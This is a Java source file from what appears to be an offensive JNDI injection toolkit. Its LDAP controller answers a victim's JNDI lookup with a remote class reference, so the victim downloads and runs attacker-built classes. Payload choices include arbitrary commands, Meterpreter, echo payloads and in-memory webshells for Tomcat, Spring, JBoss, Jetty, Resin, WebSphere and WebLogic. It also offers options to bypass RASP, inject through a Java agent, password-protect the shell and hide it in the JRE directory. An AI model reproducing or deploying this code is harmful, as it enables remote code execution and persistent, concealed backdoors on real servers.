package com.qi4l.jndi.controllers;

import com.qi4l.jndi.enumtypes.GadgetType;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.exceptions.IncorrectParamsException;
import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.utils.InjShell;
import com.qi4l.jndi.gadgets.utils.Util;
import com.qi4l.jndi.template.*;
import com.qi4l.jndi.template.Websphere.WSFMSFromThread;
import com.qi4l.jndi.template.Websphere.WebsphereMemshellTemplate;
import com.qi4l.jndi.template.Websphere.websphereEcho;
import com.qi4l.jndi.template.jboss.JBFMSFromContextF;
import com.qi4l.jndi.template.jboss.JBSMSFromContextS;
import com.qi4l.jndi.template.jboss.JbossEcho;
import com.qi4l.jndi.template.jetty.JFMSFromJMXF;
import com.qi4l.jndi.template.jetty.JSMSFromJMXS;
import com.qi4l.jndi.template.jetty.jettyEcho;
import com.qi4l.jndi.template.resin.RFMSFromThreadF;
import com.qi4l.jndi.template.resin.RSMSFromThreadS;
import com.qi4l.jndi.template.resin.resinEcho;
import com.qi4l.jndi.template.spring.SpringControllerMS;
import com.qi4l.jndi.template.spring.SpringInterceptorMS;
import com.qi4l.jndi.template.tomcat.*;
import com.qi4l.jndi.template.weblogic.weblogicEcho;
import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
import com.qi4l.jndi.gadgets.utils.HexUtils;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.cli.*;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

import java.net.URL;

import static com.qi4l.jndi.gadgets.utils.InjShell.*;
import static org.fusesource.jansi.Ansi.ansi;

/**
 * 本地工厂类加载路由
 */
@LdapMapping(uri = {"/basic"})
public class BasicController implements LdapController {
    //最后的反斜杠不能少
    private final  String      codebase = Config.codeBase;
    private static PayloadType payloadType;
    private        String[]    params;
    private        GadgetType  gadgetType;
    public static  CommandLine cmdLine;

    /**
     * 发送LDAP资源引用结果和基本远程参考负载。
     *
     * @param result InMemoryInterceptedSearchResult类型，拦截的查询结果。
     * @param base   String类型，基本的LDAP路径。
     * @throws Exception
     */
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+]|@Sending LDAP ResourceRef result for" + base + " with basic remote reference payload"));
            Entry     e         = new Entry(base);
            String    className = "";
            CtClass   ctClass;
            ClassPool pool;

            // 根据不同的负载类型，设置className并处理
            switch (payloadType) {
                case qi4l:
                    CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                    commandTemplate.cache();
                    className = commandTemplate.getClassName();
                    break;
                case meterpreter:
                    className = Meterpreter.class.getName();
                    break;
                case tomcatecho:
                    className = TomcatEchoTemplate.class.getName();
                    break;
                case springecho:
                    className = SpringEchoTemplate.class.getName();
                    break;
                case weblogicecho:
                    className = weblogicEcho.class.getName();
                    break;
                case websphereecho:
                    className = websphereEcho.class.getName();
                    break;
                case resinecho:
                    className = resinEcho.class.getName();
                    break;
                case jbossecho:
                    className = JbossEcho.class.getName();
                    break;
                case windowsecho:
                    className = WindowsEcho.class.getName();
                    break;
                case linuxecho1:
                    className = LinuxEcho1.class.getName();
                    break;
                case linuxecho2:
                    className = LinuxEcho2.class.getName();
                    break;
                case jettyecho:
                    className = jettyEcho.class.getName();
                    break;
                case allecho:
                    className = AllEcho.class.getName();
                    break;
                case tomcatfilterjmx:
                    className = structureShell(TFJMX.class);
                    break;
                case tomcatfilterth:
                    className = structureShell(TFMSFromThreadF.class);
                    break;
                case tomcatlistenerjmx:
                    className = structureShell(TLMSFromJMXLi.class);
                    break;
                case tomcatlistenerth:
                    className = structureShell(TLMSFromThreadLi.class);
                    break;
                case tomcatservletjmx:
                    className = structureShell(TSMSFromJMXS.class);
                    break;
                case tomcatservletth:
                    className = structureShell(TSMSFromThreadS.class);
                    break;
                case jbossfilter:
                    className = structureShell(JBFMSFromContextF.class);
                    break;
                case jbossservlet:
                    className = structureShell(JBSMSFromContextS.class);
                    break;
                case webspherememshell:
                    className = WebsphereMemshellTemplate.class.getName();
                    break;
                case springinterceptor:
                    className = structureShell(SpringInterceptorMS.class);
                    break;
                case springcontroller:
                    className = structureShell(SpringControllerMS.class);
                    break;
                case issuccess:
                    className = isSuccess.class.getName();
                    break;
                case jettyfilter:
                    className = structureShell(JFMSFromJMXF.class);
                    break;
                case jettyservlet:
                    className = structureShell(JSMSFromJMXS.class);
                    break;
                case wsfilter:
                    Config.init();
                    pool = ClassPool.getDefault();
                    pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
                    ctClass = pool.get(WSFMSFromThread.class.getName());
                    InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
                    ctClass.setName(ClassNameUtils.generateClassName());
                    if (Config.winAgent) {
                        className = insertWinAgent(ctClass);
                        ctClass.writeFile();
                        break;
                    }
                    if (Config.linAgent) {
                        className = insertLinAgent(ctClass);
                        ctClass.writeFile();
                        break;
                    }
                    if (Config.HIDE_MEMORY_SHELL) {
                        switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                            case 1:
                                break;
                            case 2:
                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                                newClass.setName(ClassNameUtils.generateClassName());
                                String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                                className = "className=\"" + ctClass.getName() + "\";";
                                newClass.defrost();
                                newClass.makeClassInitializer().insertBefore(content);
                                newClass.makeClassInitializer().insertBefore(className);

                                if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                                    Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                                    CtClass superClass   = pool.get(abstTranslet.getName());
                                    newClass.setSuperclass(superClass);
                                }

                                className = newClass.getName();
                                newClass.writeFile();
                                break;
                        }
                    }
                    className = ctClass.getName();
                    ctClass.writeFile();
                    break;
                case tomcatexecutor:
                    Config.init();
                    pool = ClassPool.getDefault();
                    pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
                    ctClass = pool.get(TWSMSFromThread.class.getName());
                    InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
                    ctClass.setName(ClassNameUtils.generateClassName());
                    if (Config.winAgent) {
                        className = insertWinAgent(ctClass);
                        ctClass.writeFile();
                        break;
                    }
                    if (Config.linAgent) {
                        className = insertLinAgent(ctClass);
                        ctClass.writeFile();
                        break;
                    }
                    if (Config.HIDE_MEMORY_SHELL) {
                        switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                            case 1:
                                break;
                            case 2:
                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                                newClass.setName(ClassNameUtils.generateClassName());
                                String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                                className = "className=\"" + ctClass.getName() + "\";";
                                newClass.defrost();
                                newClass.makeClassInitializer().insertBefore(content);
                                newClass.makeClassInitializer().insertBefore(className);

                                if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                                    Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                                    CtClass superClass   = pool.get(abstTranslet.getName());
                                    newClass.setSuperclass(superClass);
                                }

                                className = newClass.getName();
                                newClass.writeFile();
                                break;
                        }
                    }
                    if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                        Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                        CtClass superClass   = pool.get(abstTranslet.getName());
                        ctClass.setSuperclass(superClass);
                    }
                    className = ctClass.getName();
                    ctClass.writeFile();
                    break;
                case resinfilterth:
                    className = structureShell(RFMSFromThreadF.class);
                    break;
                case resinservletth:
                    className = structureShell(RSMSFromThreadS.class);
                    break;
                case tomcatupgrade:
                    Config.init();
                    pool = ClassPool.getDefault();
                    pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
                    ctClass = pool.get(TUGMSFromJMXuP.class.getName());
                    InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
                    ctClass.setName(ClassNameUtils.generateClassName());
                    if (Config.winAgent) {
                        className = insertWinAgent(ctClass);
                        ctClass.writeFile();
                        break;
                    }
                    if (Config.linAgent) {
                        className = insertLinAgent(ctClass);
                        ctClass.writeFile();
                        break;
                    }
                    if (Config.HIDE_MEMORY_SHELL) {
                        switch (Config.HIDE_MEMORY_SHELL_TYPE) {
                            case 1:
                                break;
                            case 2:
                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
                                newClass.setName(ClassNameUtils.generateClassName());
                                String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                                className = "className=\"" + ctClass.getName() + "\";";
                                newClass.defrost();
                                newClass.makeClassInitializer().insertBefore(content);
                                newClass.makeClassInitializer().insertBefore(className);

                                if (Config.IS_INHERIT_ABSTRACT_TRANSLET) {
                                    Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                                    CtClass superClass   = pool.get(abstTranslet.getName());
                                    newClass.setSuperclass(superClass);
                                }

                                className = newClass.getName();
                                newClass.writeFile();
                                break;
                        }
                    }
                    className = ctClass.getName();
                    ctClass.writeFile();
                    break;
            }

            // 从给定的代码库路径和类名创建URL
            URL turl = new URL(new URL(this.codebase), className + ".class");
            System.out.println(ansi().render("@|green [+]|@ Send LDAP reference result for " + base + " redirecting to" + turl));
            // 创建一个新的条目并添加属性
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaCodeBase", this.codebase);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            // 如果className是Meterpreter，则添加javaFactory属性为“Meterpreter”，否则为className
            if (className.equals("com.feihong.ldap.template.Meterpreter")) {
                e.addAttribute("javaFactory", "Meterpreter");
            }
            e.addAttribute("javaFactory", className);
            // 发送搜索条目并设置结果代码为成功
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }

    }

    /**
     * 处理传入的参数 base
     *
     * @param base 传入的参数
     * @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
     * @throws IncorrectParamsException        错误的参数异常
     */
    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                // 将类型值设为从第一个斜杠后的字符串到第二个斜杠前（不包括第二个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@PaylaodType >> " + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }

            // 获取第三个斜杠的索引
            int thirdIndex = base.indexOf("/", secondIndex + 1);
            // 如果第三个斜杠为空，则执行以下语句块
            if (thirdIndex != -1) {
                // 如果第三个斜杠小于0，则将其设置为字符串长度
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 GadgetType 枚举类型
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            // 如果载荷类型为 shell，则执行以下语句块
            if (gadgetType == GadgetType.shell) {
                String   arg     = Util.getCmdFromBase(base);
                String[] args    = arg.split(" ");
                Options  options = new Options();
                options.addOption("t", "typefggg", false, "选择内存马的类型");
                options.addOption("a", "AbstractTranslet", false, "是否继承恶意类 AbstractTranslet");
                options.addOption("o", "obscure", false, "使用反射绕过");
                options.addOption("w", "winAgent", false, "Windows下使用Agent写入");
                options.addOption("l", "linAgent", false, "Linux下使用Agent写入");
                options.addOption("u", "url", true, "内存马绑定的路径,default [/version.txt]");
                options.addOption("pw", "password", true, "内存马的密码,default [p@ssw0rd]");
                options.addOption("r", "referer", true, "内存马 Referer check,default [https://nu1r.cn/]");
                options.addOption("h", "hide-mem-shell", false, "通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持SpringController");
                options.addOption("ht", "hide-type", true, "隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/");

                CommandLineParser parser = new DefaultParser();

                try {
                    cmdLine = parser.parse(options, args);
                } catch (Exception e) {
                    System.out.println("[*] Parameter input error, please use -h for more information");
                }

                if (cmdLine.hasOption("typefggg")) {
                    Config.Shell_Type = cmdLine.getOptionValue("typefggg");
                    //System.out.println("[+] 内存shell :" + Shell_Type);
                }

                if (cmdLine.hasOption("winAgent")) {
                    Config.winAgent = true;
                    System.out.println(ansi().fgRgb(188, 232, 105).render("[+] Windows下使用Agent写入"));
                }

                if (cmdLine.hasOption("linAgent")) {
                    Config.winAgent = true;
                    System.out.println(ansi().fgRgb(188, 232, 105).render("[+] Linux下使用Agent写入"));
                }

                if (cmdLine.hasOption("obscure")) {
                    Config.IS_OBSCURE = true;
                    System.out.println(ansi().fgRgb(188, 232, 105).render("[+] 使用反射绕过RASP"));
                }

                if (cmdLine.hasOption("url")) {
                    String url = cmdLine.getOptionValue("url");
                    if (!url.startsWith("/")) {
                        url = "/" + url;
                    }
                    Config.URL_PATTERN = url;
                    System.out.println("[+] Path：" + Config.URL_PATTERN);
                }

                if (cmdLine.hasOption("password")) {
                    Config.PASSWORD = HexUtils.generatePassword(cmdLine.getOptionValue("password"));
                    System.out.println("[+] Password：" + Config.PASSWORD);
                }

                if (cmdLine.hasOption("referer")) {
                    Config.HEADER_KEY = cmdLine.getOptionValue("referer");
                    System.out.println("[+] referer：" + Config.HEADER_KEY);
                }

                if (cmdLine.hasOption("AbstractTranslet")) {
                    Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
                    System.out.println("[+] 继承恶意类AbstractTranslet");
                }

                if (cmdLine.hasOption("hide-mem-shell")) {
                    Config.HIDE_MEMORY_SHELL = true;

                    if (cmdLine.hasOption("hide-type")) {
                        Config.HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
                    }
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+]|@ Command >> " + cmd));
                params = new String[]{cmd};
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
